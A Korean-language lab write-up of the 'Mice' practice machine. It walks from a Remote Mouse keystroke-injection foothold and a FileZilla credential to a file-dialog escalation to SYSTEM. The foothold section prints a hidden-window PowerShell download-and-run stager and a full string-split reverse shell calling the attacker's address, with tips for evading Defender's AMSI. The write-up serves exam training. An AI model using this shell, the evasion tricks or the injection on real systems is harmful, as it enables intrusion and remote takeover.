---
tags:
  - type/machine
  - platform/pg
  - status/solved
  - tech/payload/revshell
  - tech/cred/config-file
  - tech/exec/rdp
  - tech/win/gui-lpe
type: machine
platform: pg
ip: 192.168.248.199
ports: [1978, 1979, 1980, 3389]
services: [ms-wbt-server, pearldoc-xact, remotemouse, unisql-java]
cves: [CVE-2022-3365, CVE-2021-35448]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---

> [!info] 상단 요약
> **Mice** · Windows 10 Pro (19042.1348) · Fundamental · 플래그 2개
> Remote Mouse 3.008 키입력 주입 RCE(EDB 46697 / CVE-2022-3365)로 `divine` 셸 → FileZilla 설정에서 `divine` 암호 회수 → RDP 로 GUI 진입 → Remote Mouse GUI 파일대화상자 LPE(CVE-2021-35448)로 SYSTEM.
> `local.txt` = `e5fe064cc8ccf3adb8c974baf67f12c5` · `proof.txt` = `31a64d6f198f495e89d3f3e134da9588` (2026-08-20 인스턴스)

## 0. 이 박스에서 배우는 것

- **연결 암호가 비어 있는 원격제어 앱** — Remote Mouse 는 폰 앱이 PC 를 조종하는 도구다. 설정에서 "Password for Connection"을 비워두면 누구나 키입력을 주입할 수 있고, 시작 메뉴에 명령을 타이핑하는 것만으로 셸이 열린다. 이 박스는 비어 있었다(스크린샷 확인).
- **설정 파일에 박힌 자격증명** — FileZilla `recentservers.xml` 의 base64 암호. 다만 그게 **누구 암호인지**를 확인하는 절차가 이 박스의 진짜 교훈이다.
- **GUI 파일 대화상자를 통한 권한상승** — SYSTEM 으로 도는 앱이 띄운 "다른 이름으로 저장" 대화상자의 **주소창**에 `cmd.exe` 경로를 넣으면 SYSTEM cmd 가 뜬다.
- **시험 출제 가능성**: 무인증 서비스 → 공개 익스플로잇 → 자격증명 회수 → 로컬 익스플로잇의 4단 체인은 OSCP 의 전형이다. 특히 "설정 파일에서 암호 찾기"와 "파일 대화상자 → cmd"는 Windows 권한상승의 반복 패턴이다.

## 1. 정찰

### Nmap

```
# Nmap 7.98 scan initiated Thu Aug 20 22:20:38 2026 as: nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.199
Nmap scan report for 192.168.248.199
Host is up (0.085s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE        VERSION
1978/tcp open  remotemouse    Emote Remote Mouse
1979/tcp open  unisql-java?
1980/tcp open  pearldoc-xact?
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
|_ssl-date: 2026-08-20T13:24:14+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: REMOTE-PC
|   NetBIOS_Domain_Name: REMOTE-PC
|   NetBIOS_Computer_Name: REMOTE-PC
|   DNS_Domain_Name: Remote-PC
|   DNS_Computer_Name: Remote-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-08-20T13:23:51+00:00
7680/tcp open  pando-pub?
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (92%), Microsoft Windows 10 1909 - 2004 (85%), Windows Server 2019 (85%)
```

핵심 줄은 **`1978/tcp open remotemouse Emote Remote Mouse`**. nmap 이 서비스 이름까지 정확히 찍어줬다. 나머지는 3389 RDP(나중에 GUI 진입에 씀), 7680(Windows Delivery Optimization, 무의미).

**1979·1980 의 `unisql-java?`·`pearldoc-xact?` 는 식별 결과가 아니다.** 물음표는 nmap 이 배너를 못 받았다는 뜻이고, 이름은 `nmap-services` 의 포트번호 사전 항목을 그냥 출력한 것이다. 직접 TCP 로 붙어봤을 때 둘 다 recv 타임아웃이었다(`banner_others.txt`). 1978 만 배너를 뱉는다:

```
1978 banner: b'SIN 15win nop nop 300'
```

**함정 — 스캔 순서.** top-1000 만 돌리면 3389 하나밖에 안 나온다(`nmap_quick.log`: `Not shown: 999 filtered`). 1978~1980 은 기본 1000 포트 밖이라 `-p-` 가 없으면 이 박스는 "RDP 만 열린 상자"로 보인다.

**UDP 스캔으로는 못 찾는다.** 상위 100 UDP 는 전부 무응답이었고(`nmap_udp.log`), 1978 은 애초에 상위 100 에 없다. 그런데 뒤에 나오듯 **키입력 주입 자체는 UDP 1978 로 나간다** — TCP 1978 은 배너/핸드셰이크용이다. 열거는 TCP 로 하고 공격은 UDP 로 하는 서비스가 있다는 걸 기억해 둘 것.

### 서비스 식별

Remote Mouse 버전은 두 근거로 확정했다 — nmap 배너(`Emote Remote Mouse`)와, 셸을 잡은 뒤 설치 프로그램 목록에서 읽은 `Remote Mouse version 3.008`(`shell443.log:868`). 3.008 은 키입력 주입(EDB 46697 / CVE-2022-3365)과 GUI 권한상승(CVE-2021-35448)이 둘 다 성립하는 버전이다.

빌드 번호가 두 군데서 다르게 보이는데 모순이 아니다. nmap 의 `Product_Version: 10.0.19041` 은 RDP NTLM 이 광고하는 **커널 버전**이고, 온-박스 `systeminfo` 는 `10.0.19042 N/A Build 19042`, cmd 배너는 `10.0.19042.1348` 이다. 19041/19042 는 같은 코드베이스(20H1/20H2)라 RDP 쪽이 19041 로 표시된다.

## 2. 취약점 분석 — 두 개의 Remote Mouse 결함

### foothold — 키입력/마우스 주입 (EDB 46697 · CVE-2022-3365)

> [!warning] CVE 번호를 잘못 붙이기 쉬운 자리다
> foothold 를 **CVE-2021-43326** 으로 적기 쉽다. 그런데 NVD 에서 그 번호는 *"Automox Agent before 32 on Windows incorrectly sets permissions on a temporary directory"* — Remote Mouse 와 무관하다.
> 이 결함에 배정된 번호는 **CVE-2022-3365** 이고, PoC 는 **EDB 46697**(2019, CVE 배정보다 앞선다)이다. Metasploit `exploit/windows/misc/remote_mouse_rce` 의 References 가 `EDB 46697` + `CVE 2022-3365` 를 나란히 달고 있어 대응 관계가 확정된다.

CVE-2022-3365 의 요지는 "**사용자가 암호를 설정하지 않으면 기본 암호로 동작하고**, 제어 프로토콜이 자명한 치환 암호로 평문 전송된다"는 것이다. 즉 엄밀히는 "인증이 아예 없다"가 아니라 **"암호를 안 걸면 사실상 없다"**이다. 이 박스는 설정 화면의 `Password for Connection` 이 비어 있었다(4장 스크린샷).

프로토콜은 단순하다. 배너/핸드셰이크는 TCP 1978, 실제 마우스·키 이벤트는 **UDP 1978** 로 던진다:

```python
def udp(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(cmd.encode(), (IP, PORT)); s.close()
```

키코드는 자체 인코딩이다 — `key  7[ras]84` 가 소문자 `a`, `key  3RTN` 이 Enter. 마우스는 `mos  5m 1 0`(1픽셀 이동)·`mos  5R l d`/`l u`(좌클릭 다운/업). PoC 가 문자→키코드 표를 통째로 담고 있어 임의 문자열을 타이핑할 수 있다.

공격 아이디어는 그래서 이렇게 된다 — 마우스를 화면 좌하단(시작 버튼)으로 몰아넣고 클릭 → 시작 메뉴 검색창에 명령을 타이핑 → Enter. 시작 메뉴가 명령을 실행한다. `mice_type.py` 의 `move(-5000, 3000)` 이 그 "몰아넣기"다. 절대 좌표를 모르니 화면 밖으로 충분히 밀어 모서리에 붙이는 것.

**주입된 키는 콘솔 세션의 현재 사용자 컨텍스트로 들어간다.** 이 박스는 AutoAdminLogon 으로 `divine` 이 자동 로그인돼 있어(`AutoAdminLogon REG_SZ 1` / `DefaultUserName REG_SZ divine`), 주입 결과가 `divine` 권한으로 실행된다.

### privesc — GUI 파일 대화상자를 통한 SYSTEM 실행 (CVE-2021-35448)

NVD 원문이 그대로 절차다 — *"Emote Interactive Remote Mouse 3.008 on Windows allows attackers to execute arbitrary programs as Administrator by using the Image Transfer Folder feature to navigate to cmd.exe."*

Remote Mouse 는 **서비스**(`RemoteMouseService.exe`, LocalSystem)와 **GUI**(`RemoteMouse.exe`)로 나뉘고, 서비스가 GUI 를 사용자 세션에 SYSTEM 권한으로 띄운다(4장에서 PPID 로 확인). 그 GUI 설정의 "Image Transfer Folder" → `Change...` 를 누르면 **SYSTEM 소유의 "다른 이름으로 저장" 대화상자**가 뜬다. 이 대화상자의 **주소창**에 `C:\Windows\System32\cmd.exe` 를 입력하고 Enter 하면 탐색기가 그 경로를 **실행**해 SYSTEM cmd 가 뜬다.

## 3. Foothold

### Kali 리스너 (tmux 필수)

```
ssh kali@10.44.44.128 "tmux new-session -d -s mice_shell 'sudo rlwrap nc -lvnp 443; exec bash'"
```

세션 전문은 `~/PG/Mice/shell443.log`(7,868행)에 남겼다.

### 어느 포트가 나가는지부터 재봤다

리버스셸이 안 붙자 포트를 바꿔가며 찍는 대신, **타겟에서 직접 아웃바운드를 프로브**해 결과를 Kali HTTP 서버의 URL 경로로 보고하게 했다. 결과는 웹 로그에 그대로 남는다:

```
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /who_divine_REMOTE-PC HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /OPEN_443 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /BLOCK_53 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /OPEN_80 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /BLOCK_4444 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:37] "GET /BLOCK_8080 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:38] "GET /RTP_True HTTP/1.1" 404 -
```

**443·80 은 나가고 53·4444·8080 은 막혀 있다.** `RTP_True` 는 Defender 실시간 보호가 켜져 있다는 뜻이고, 이게 다음 단계의 복선이 된다.

셸이 안 붙는 이유를 추측으로 좁히지 말고 이렇게 **한 번에 전부 재는 것**이 시험장에서 훨씬 싸다. 404 여도 상관없다 — 요청이 도착했다는 사실만 필요하다.

### 키입력 주입으로 셸 열기

EDB 46697 을 py3 로 포팅한 스크립트로 시작 메뉴에 스테이저를 타이핑한다:

```
python3 mice_type.py "powershell -nop -w hidden iex(irm http://192.168.45.207/a)"
```

`/a` 가 리버스셸이다. **⚠️ 페이로드는 반드시 난독화하라** — 처음 올린 `/a` 는 평문 `System.Net.Sockets.TCPClient` 였고 셸이 오지 않았다. 문자열을 쪼갠 판으로 바꾼 뒤(`22:32`) 바로 붙었다:

```powershell
$TC='System.Net.Sockets.TCP'+'Client'
$c=New-Object $TC('192.168.45.207',443)
$s=$c.GetStream()
$hi=([text.encoding]::ASCII).GetBytes('HELLO-SHELL-ALIVE'+[char]10)
$s.Write($hi,0,$hi.Length);$s.Flush()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
 $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)
 $sb=(& ([scriptblock]::Create($d)) 2>&1 | Out-String )
 $sb2=$sb+'PS '+(pwd).Path+'> '
 $sby=([text.encoding]::ASCII).GetBytes($sb2)
 $s.Write($sby,0,$sby.Length);$s.Flush()
}
$c.Close()
```

플래그 하나씩 짚으면 — `-nop` 은 프로필 로딩을 건너뛰어 시작을 빠르게 하고(시작 메뉴 타이핑은 문자당 0.4초라 명령이 길수록 손해다), `-w hidden` 은 창을 숨겨 화면에 PowerShell 창이 뜨는 것을 막는다. 화면이 그대로 노출되는 GUI 주입에서는 이게 실용적인 차이다.

`iex` 대신 `& ([scriptblock]::Create($d))` 를 쓴 것도 의도적이다. `iex` 는 AMSI 가 가장 먼저 보는 이름이라 그 자체로 시그니처를 끈다.

셸을 잡으면 `whoami` = `remote-pc\divine`.

### 셸 직후 반사 열거

Windows 에서는 `find -perm`·`getcap` 자리에 다른 것들이 들어간다. 이 박스에서는 `whoami /all`(그룹·특권) → `net user`·`net localgroup administrators`(누가 관리자인가) → 서비스 목록과 바이너리 `icacls`(쓰기 가능한 것) → `schtasks`(비-MS 예약작업) → `reg query`(AutoAdminLogon·AlwaysInstallElevated·Run 키) → `cmdkey /list`(저장된 자격증명) 순으로 훑었다. 이걸 한 스크립트로 묶은 것이 `www/harvest.ps1` 이고, 산출물이 `harvest_divine.txt`(6,692행)다.

결과: `divine` 은 `Users` · `Remote Desktop Users` 소속의 평범한 사용자. 관리자 그룹 멤버는 `Administrator` 단독, `whoami /priv` 에 `SeImpersonate` 없음, `AlwaysInstallElevated` 없음(양쪽 하이브 다 키 없음), SAM 은 `Access is denied`(SeriousSAM 불가), 쓰기 가능한 서비스 바이너리 없음, 비-MS 예약작업은 OneDrive 뿐, 저장된 자격증명은 `LegacyGeneric:target=XboxLive` 하나. 표준 벡터가 전부 막혀 있었다.

### 사용자 플래그

`local.txt` 는 nc 리버스셸(대화형 PowerShell) 안에서 읽었다:

```
whoami; hostname; (ipconfig | Select-String IPv4); Get-Date; type C:\Users\divine\Desktop\local.txt
remote-pc\divine
Remote-PC

   IPv4 Address. . . . . . . . . . . : 192.168.248.199

DateTime    : Thursday, August 20, 2026 6:34:45 AM

e5fe064cc8ccf3adb8c974baf67f12c5


PS C:\WINDOWS\system32>
```

(`Get-Date` 의 전체 속성 목록은 줄였다. 원문은 `~/PG/Mice/proof_user.txt`.)

## 4. 권한상승

### 자격증명 회수 — FileZilla 설정

```
type C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml
```
```xml
	<RecentServers>
		<Server>
			<Host>ftp.pg</Host>
			<Port>21</Port>
			<Protocol>0</Protocol>
			<Type>0</Type>
			<User>divine</User>
			<Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
			<Logontype>1</Logontype>
			<PasvMode>MODE_DEFAULT</PasvMode>
			<EncodingType>Auto</EncodingType>
			<BypassProxy>0</BypassProxy>
		</Server>
	</RecentServers>
```

`echo Q29udHJvbEZyZWFrMTE= | base64 -d` → **`ControlFreak11`**.

### 이 암호가 누구 것인지부터 확정한다

FileZilla 암호가 나오면 반사적으로 Administrator 재사용을 의심하게 된다. 넘겨짚지 말고 온-박스에서 로컬 SAM 에 대고 직접 물어본다. `www/e6.ps1` 로 올려 셸에서 실행했다:

```powershell
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext("Machine")
Write-Output ("--VALID-ADMIN=" + $ctx.ValidateCredentials("Administrator","ControlFreak11"))
Write-Output ("--VALID-DIVINE=" + $ctx.ValidateCredentials("divine","ControlFreak11"))
```
```
PS C:\WINDOWS\system32> --VALID-ADMIN=False
--VALID-DIVINE=True
```

**`ControlFreak11` 은 divine 자신의 Windows 암호였다** — Administrator 재사용이 아니다. 이후 이 자격증명으로 RDP 가 실제로 붙은 것이 두 번째 확인이 된다.

그럼 이 암호의 쓸모는? divine 이 `Remote Desktop Users` 이므로 **RDP 로 GUI 세션에 진입**하는 데 쓴다. Remote Mouse GUI LPE 는 화면 조작이 필요하기 때문이다.

### RDP 진입 → Remote Mouse GUI LPE

```
xfreerdp3 /v:192.168.248.199 /u:divine /p:ControlFreak11 /cert:ignore
```

GUI 에서:
1. 트레이의 Remote Mouse 아이콘 우클릭 → **Preferences**
2. **Settings** 탭 → 하단 **Image Transfer Folder** → **Change...**
3. "다른 이름으로 저장" 대화상자가 뜨면서 `C:\WINDOWS\system32\config\systemprofile\Desktop is unavailable` 오류가 함께 뜬다 — **이 대화상자가 SYSTEM 프로필에서 도는 증거**다. OK 로 닫는다.
4. 대화상자 **주소창**(파일 이름 칸 아님)을 클릭해 편집 모드로 만들고 `C:\Windows\System32\cmd.exe` 입력 → Enter.

![[PG-Mice-remotemouse-settings.png]]

설정 화면 자체가 두 가지를 동시에 보여준다 — 아래쪽 `Image Transfer Folder`(현재 값 `c:`)의 `Change...` 가 LPE 트리거이고, 가운데 `Password for Connection` 이 **비어 있는 것**이 3장 foothold 가 성립한 이유다.

![[PG-Mice-system-saveas-dialog.png]]

`Save As` 대화상자와 `Location is not available` 오류가 함께 잡혔다. 오류 본문이 `C:\WINDOWS\system32\config\systemprofile\Desktop` 을 가리키는 것 — 이게 대화상자의 주인이 SYSTEM 이라는 결정적 신호다. 일반 사용자 프로세스라면 절대 그 경로를 홈으로 삼지 않는다.

![[PG-Mice-admin-cmd.png]]

`Administrator: C:\Windows\System32\cmd.exe` 창이 뜬다. 제목이 `Administrator:` 로 시작하는 것은 관리자 무결성이라는 뜻이고, 실제 토큰은 다음 절에서 `whoami` 로 확인한다.

### 왜 이게 SYSTEM 이 되는가

`RemoteMouseService.exe`(LocalSystem)가 부모 프로세스가 되어 GUI 두 프로세스를 사용자 세션에 띄운다:

```
Name            : RemoteMouseService.exe
ProcessId       : 2284
ParentProcessId : 664
SessionId       : 0

Name            : RemoteMouseCore.exe
ProcessId       : 2632
ParentProcessId : 2284
SessionId       : 1

Name            : RemoteMouse.exe
ProcessId       : 2640
ParentProcessId : 2284
SessionId       : 1
```

Core·GUI 둘 다 `ParentProcessId = 2284` = 서비스 PID 다. 서비스가 세션 0 에 있으면서 자식만 세션 1 로 내보냈다 — Session 0 격리를 우회하는 전형적인 형태다. 그래서 GUI 가 띄우는 파일 대화상자도 SYSTEM 이고, 거기서 실행한 cmd 가 SYSTEM 을 물려받는다.

`Get-CimInstance Win32_Process` 의 `GetOwner` 는 이 프로세스들에 대해 Domain/User 를 **빈 문자열**로 돌려준다(`RemoteMouse.exe PID=2640 Owner=\ Session=1`). 소유자가 없어서가 아니라 divine 권한으로는 SYSTEM 프로세스의 소유자를 조회할 수 없어서다 — 그 자체가 "내 권한 밖의 프로세스"라는 신호다.

### 관리자 플래그 — 증거는 스크린샷이 원본이다

SYSTEM cmd 에서 증거 한 화면을 찍었다.

![[PG-Mice-proof-system.png]]

**이 스크린샷이 1차 증거다.** 아래 코드블록은 그 화면에서 **손으로 옮겨 적은 전사본**이지 캡처된 스트림이 아니다 — 원시 캡처를 회수하지 못한 경위는 6장에 적었다. 값은 스크린샷과 한 글자씩 대조했다.

```
C:\>whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\Users\Administrator\Desktop\proof.txt
nt authority\system
Remote-PC
   IPv4 Address. . . . . . . . . . . : 192.168.248.199
Thu 08/20/2026
08:05 AM
31a64d6f198f495e89d3f3e134da9588
```

`&` 로 이어 붙인 것은 OSCP 증거 관례(`whoami`·`hostname`·IP·플래그를 **한 화면에**)를 cmd 에서 한 줄로 만족시키기 위해서다. 리눅스의 `;` 자리에 cmd 는 `&` 를 쓴다.

## 5. 플래그

| 플래그 | 위치 | 값 | 어떻게 읽었나 |
|---|---|---|---|
| local.txt | `C:\Users\divine\Desktop\` | `e5fe064cc8ccf3adb8c974baf67f12c5` | nc 리버스셸(대화형 PowerShell) |
| proof.txt | `C:\Users\Administrator\Desktop\` | `31a64d6f198f495e89d3f3e134da9588` | 대화형 SYSTEM cmd |

둘 다 웹셸이 아닌 대화형 셸에서 원위치 `type` 으로 읽었다. OSCP 는 웹셸로 얻은 플래그를 0점 처리한다.

## 6. 막혔던 지점 / 시행착오

취약점 식별은 빨랐지만 **GUI LPE 를 헤드리스 Kali 에서 구동하는 데** 시간의 대부분을 썼다. 순서대로 남긴다.

**표준 Windows 권한상승 벡터가 전부 막혀 있었다.** 서비스 바이너리와 그 상위 디렉터리 `icacls`, 예약작업, Run 키, `AlwaysInstallElevated`, 저장된 자격증명(`cmdkey`), SeriousSAM 까지 훑었으나 divine 이 건드릴 수 있는 것이 없었다. **여기서 "설정 파일 자격증명"으로 방향을 튼 것이 옳았다.**

**`ControlFreak11` 을 Administrator 암호로 오인하지 않은 것이 중요했다.** `ValidateCredentials` 로 `Administrator=False / divine=True` 를 확인해 **암호의 진짜 용도(=divine 의 RDP 로그인)를 특정**했다. 이걸 건너뛰었으면 freerdp 로 Administrator 를 계속 두드리며 시간을 태웠을 것이다.

**EDB 50258(unquoted service path)은 이 박스에서 성립하지 않았다.** `RemoteMouseService` 의 경로가 따옴표 없이 등록돼 있는 것은 사실이다:

```
RemoteMouseService   LocalSystem   Running   Auto   C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe
```

공백에서 끊기는 후보는 `C:\Program.exe` → `C:\Program Files.exe` → `C:\Program Files (x86)\Remote.exe` 순이고, **가장 먼저 시도되는 것은 `C:\Program.exe`, 즉 C 드라이브 루트다.** 거기 ACL 을 재보면 끝난다:

```
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
```

`Authenticated Users` 의 `(M)` 에 **`(IO)` = Inherit Only** 가 붙어 있다. 상속으로 만들어질 하위 개체에만 적용되고 `C:\` 자체에는 적용되지 않는다. `C:\` 에 직접 걸린 것은 `(AD)` = **디렉터리 생성만** 허용이다. 그래서 `C:\Program.exe` 라는 **파일**은 만들 수 없다. Windows 기본 설치의 표준 방어이고, unquoted service path 가 실무에서 대개 안 통하는 이유가 이것이다.

> [!tip] unquoted service path 를 봤을 때 재야 할 것
> 경로에 공백이 있다는 사실이 아니라 **끊기는 지점의 디렉터리에 파일을 만들 수 있는가**다. `C:\` 루트가 후보라면 `icacls C:\` 로 `(AD)` 와 `(IO)` 를 먼저 확인하라. `(AD)` 만 있으면 폴더는 만들어져도 exe 는 못 놓는다.
>
> 참고로 `~/PG/Mice/harvest_divine.txt` 의 `UNQUOTED SERVICE PATHS` 절은 필터가 잘못 잡혀 **`svchost.exe -k ...` 형태를 전부 "unquoted" 로 나열**한다. 자작 열거 스크립트의 오탐이 이렇게 생긴다는 예시로 남겨둔다.

**`C:\freezeScript\win10.ps1` 도 벡터가 아니었다.** 디스크에 남은 PowerShell transcript 헤더에서 이런 게 나왔다:

```
Windows PowerShell transcript start
Start time: 20260820061010
Username: REMOTE-PC\Administrator
RunAs User: REMOTE-PC\Administrator
Host Application: C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden -NoProfile -Command C:\freezeScript\win10.ps1
```

**Administrator 가, `-ExecutionPolicy bypass` 로, 이 인스턴스가 켜진 날 06:10:10 에** 돌렸다. 여기까지만 보면 완벽한 하이재킹 대상이다. 그런데 `dir C:\freezeScript` 는 `The system cannot find the file specified` — 스크립트가 자기 자신을 지우고 끝난 뒤다. 트리거도 사용자가 손댈 수 있는 곳에 없었다(HKCU Run 은 OneDrive 뿐, 비-MS 예약작업도 OneDrive 뿐). **프로비저닝 잔재이고 재실행 지점이 없으므로 배제.**

**Defender AMSI 가 열거 스크립트를 차단했다.** PrivescCheck 를 올리자 그 자리에서:

```
PS C:\WINDOWS\system32> iex : At line:1 char:1
+ #Requires -Version 2
+ ~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:1
+ iex(irm http://192.168.45.207/pc.ps1)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

주목할 점은 **`ParserError` 라는 것**이다. AMSI 는 스크립트를 파싱하기도 전에 통째로 막는다. 그래서 "스크립트 안쪽 어디가 걸렸나"를 찾는 건 의미가 없고, 전송 형태 자체를 바꿔야 한다.

`[가정]` **평문 리버스셸이 안 붙은 것도 같은 원인으로 본다.** 이쪽은 차단 메시지를 직접 보지 못했다 — 시작 메뉴 주입은 출력이 돌아올 콘솔이 없기 때문이다. 근거는 정황 셋이다: (1) 온타겟 프로브가 `RTP_True`(실시간 보호 켜짐)를 보고했고, (2) 평문 `System.Net.Sockets.TCPClient` 판은 443 이 열려 있는데도 콜백이 없었으며(`shell4444/53/8080.log` 는 물론 443 도 조용했다), (3) 문자열을 쪼갠 판으로 교체하자 같은 포트로 즉시 붙었다. 재부팅 뒤 다시 평문판(`r.ps1`)을 두 번 던졌을 때도 콜백이 없었던 것(`rce_retry.log`)이 같은 방향이다.

**가장 오래 막힌 곳 — Remote Mouse 트레이 아이콘이 RDP 화면에 없었다.** 먼저 세션 토폴로지부터 재봤다:

```
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>rdp-tcp#16        divine                    1  Active
 console                                     3  Conn
 rdp-tcp                                 65536  Listen
---
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>divine                rdp-tcp#16          1  Active          1  7/16/2026 4:24 PM
```

읽는 법이 중요하다. divine 의 세션은 **ID 1** 이고, 로그온 시각이 `7/16/2026 4:24 PM` — 내가 만든 세션이 아니라 **원래 콘솔에 자동 로그인돼 있던 세션에 RDP 가 재접속(reconnect)해 들어간 것**이다. 그 증거가 `SESSIONNAME` 이 `console` 에서 `rdp-tcp#16` 으로 바뀐 것이고, 남은 `console`(ID 3)은 사용자 없이 `Conn` 상태로 비어 있다.

그리고 `RemoteMouse.exe`(PID 2640)·`RemoteMouseCore.exe`(PID 2632)도 **같은 세션 1** 에 있었다. 즉 **세션이 갈려서 아이콘이 안 보인 게 아니다** — 같은 세션인데 알림 영역이 아이콘을 다시 그려주지 않았다. 세션을 콘솔에서 RDP 로 리다이렉트할 때, 이미 등록돼 있던(그것도 상위 무결성으로 도는) 프로세스의 트레이 아이콘은 재생성되지 않는 경우가 있다. 오버플로우 영역도 비어 있었고 Alt-Tab 에도 창이 없었다. `[가정]` — 이 렌더링 실패의 정확한 메커니즘까지는 확인하지 못했다.

직접 띄우는 우회로도 막혀 있었다. `RemoteMouse.exe` 는 `requireAdministrator` 매니페스트라 divine 이 실행하면 UAC 가 관리자 암호를 요구한다:

```
PS C:\WINDOWS\system32> Start-Process : This command cannot be run due to the
error: The operation was canceled by the user.
+ Start-Process "C:\Program Files (x86)\Remote Mouse\RemoteMouse.exe"; ...
```

`The operation was canceled by the user` 는 내가 취소한 게 아니라 **응답할 대상이 없는 UAC 프롬프트가 자동으로 거절된 것**이다. 헤드리스에서 UAC 를 만나면 이 문구가 나온다고 기억해 두면 오독을 아낀다.

**해결 — 리부트로 세션 재생성.** `shutdown /r` 로 재부팅했다(divine 은 `SeShutdownPrivilege` 를 갖고 있다 — `whoami /priv` 에 `Disabled` 로 나오지만 Disabled 는 "없다"가 아니라 "아직 활성화 안 됐다"이고, `shutdown` 이 알아서 활성화한다). 부팅 후 자동 로그인이 divine 을 콘솔에 앉히고 서비스가 GUI 를 새로 띄우며, 그 시점에 RDP 로 붙으면 아이콘이 처음부터 그려진 세션을 받는다. 검증은 키입력 주입으로 했다 — 주입한 `TESTREBOOT` 가 내 RDP 화면의 Edge 주소창(`bing.com/search?q=TESTREBOOT`)에 그대로 나타났고, 트레이에 Remote Mouse 아이콘도 있었다.

앞서 `logoff` 로 세션을 끝낸 것이 사태를 더 꼬았다. **함부로 logoff 하지 마라** — 이 박스에서는 그 대가로 nc 리버스셸도 같이 잃었다.

**파일 대화상자 — "파일 이름" 칸이 아니라 "주소창"이다.** 처음에 파일 이름 칸에 `cmd.exe` 경로를 넣고 Enter 하니 저장 시도로 처리됐다. **저장 대화상자에서 exe 를 실행하려면 주소창(브레드크럼)을 클릭해 편집 모드로 만든 뒤 경로를 넣어야** 탐색기가 그것을 "이동할 위치"로 해석하고, 대상이 실행 파일이면 실행한다.

### 권한 레벨마다 열거를 다시 돌려라 — 측정된 사실

SYSTEM cmd 를 잡은 뒤 **같은 `harvest.ps1` 을 그대로 다시 돌렸다.** 결과가 확연히 다르다:

![[PG-Mice-harvest-system-9282.png]]

```
C:\>powershell -ep bypass -c "iex(irm http://192.168.45.207/harvest.ps1)"
HARVEST_DONE C:\WINDOWS\TEMP\harvest_REMOTE-PC.txt

C:\>powershell -c "(gc C:\Windows\Temp\harvest_REMOTE-PC.txt).Count; gc C:\Windows\Temp\harvest_REMOTE-PC.txt | Select-Object -Last 4"
9282
Successfully processed 0 files; Failed processing 1 files

===== DONE =====
harvest complete -> C:\WINDOWS\TEMP\harvest_REMOTE-PC.txt
```

**divine 6,692행 → SYSTEM 9,282행, 차이 2,590행.** `harvest.ps1` 의 16개 열거 섹션을 전부 완주하고 `===== DONE =====` 마커까지 찍혔으니 스크립트가 중간에 죽어서 짧았던 게 아니다. 저권한에서는 서비스 DACL, 다른 사용자 프로필, 레지스트리 하이브, 예약작업 상세가 **조용히 잘려서** 돌아온다 — 에러가 아니라 그냥 빈 줄로 온다.

"권한 레벨마다 한 번씩 돌려라"는 이제 감이 아니라 이 숫자다. 저권한 열거 결과를 "이 박스엔 아무것도 없다"의 근거로 쓰지 마라.

### 원시 터미널 캡처가 없는 이유

SYSTEM 획득 이후의 작업은 **RDP GUI 안에서만** 이뤄졌고, 그 시점에 Kali SSH 가 끊겨 있었다. 그래서 SYSTEM cmd 의 출력을 파일로 회수하지 못했다. 빼내려는 시도도 실패했다 — `~/PG/Mice/rdp44.png` 에 남은 것은 GUI 로 타이핑한 `ReadAllBytes(...)` 원라이너가 이스케이프가 깨져(`\x27`) 파서 에러로 죽은 화면이다. `harvest_admin.txt` 가 **0바이트**인 것이 그 흔적이다.

남은 증거는 **스크린샷뿐이고, 그것이 1차 사료다.** 4장의 코드블록은 그 스크린샷의 전사본이다.

> [!warning] 여기서 배울 것
> 증거 회수 경로(파일 exfil)와 조작 경로(GUI)가 **다른 채널**일 때, 조작 채널만 살아 있으면 증거는 화면에 갇힌다. 상위 권한을 잡자마자 **가장 먼저 할 일이 증거 한 화면 찍기**인 이유다 — 실제로 이 박스는 그것만 제때 해둔 덕에 플래그가 인정됐다.

## 7. OSCP 시험 관점

